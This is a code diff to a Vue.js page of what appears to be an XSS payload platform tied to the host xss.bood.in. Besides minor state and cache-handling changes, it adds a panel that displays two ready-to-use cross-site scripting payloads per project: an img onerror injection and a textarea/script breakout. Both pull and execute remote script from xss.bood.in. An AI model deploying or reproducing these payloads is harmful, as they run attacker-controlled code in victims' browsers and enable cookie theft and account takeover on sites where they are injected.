@@ -123,6 +123,12 @@
     padding: .25rem;
     width: 100%;
 }
+.code-block {
+    background: #ececec;
+    padding: .5rem 1rem;
+    font-size: .8rem;
+    margin-bottom: 1rem;
+}
 </style>
 
 <template>
@@ -172,6 +178,19 @@
                     <div class="text-row-title">模块</div>
                     <cov-select :select="select"></cov-select>
                 </div>
+                <div class="text-row" v-if="edit.alias">
+                    <div class="text-row-title">接口地址</div>
+                    <p>{{edit.alias}}</p>
+                </div>
+                <div v-if="edit.alias">
+                    <p class="code-block">
+                    {{ `&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.bood.in/code?id=${edit.alias}';&gt;`}}
+                    </p>
+                    <p class="code-block">
+                        {{`&lt;/textarea&gt;'"&gt;&lt;script src=http://xss.bood.in/code?id=${edit.alias}&gt;&lt;/script&gt;`}}
+                    </p>
+                </div>
+                
             </div>
         </div>
     </div>
@@ -188,7 +207,8 @@ export default {
             edit: {
                 project: null,
                 title: '',
-                summary: ''
+                summary: '',
+                alias: ''
             },
             select: {
                 remove: [],
@@ -209,6 +229,7 @@ export default {
             this.edit.project = null
             this.edit.title = ''
             this.edit.summary = ''
+            this.edit.alias = ''
             this.select.value = []
             this.select.remove = []
         },
@@ -216,6 +237,8 @@ export default {
             this.edit.project = item
             this.edit.title = item.get('title')
             this.edit.summary = item.get('summary')
+            this.edit.alias = item.get('alias')
+
             let query = item.relation('Module').query()
 
             this.queryModule(() => {
@@ -280,7 +303,6 @@ export default {
             return result
         },
         delCache (id) {
-            console.log(id)
             this.$http.get('/code/fresh', {
                 params: {
                     id: id
@@ -308,8 +330,6 @@ export default {
             modules.forEach(m => {
                 moduleRlt.add(m.item)
             })
-
-            this.delCache(alias)
             
             current.save({
                 title: title,
@@ -319,7 +339,9 @@ export default {
                 creator: AV.User.current()
             })
             .then(module => {
+                this.edit.alias = alias
                 this.queryList()
+                this.delCache(alias)
             })
         }
     }
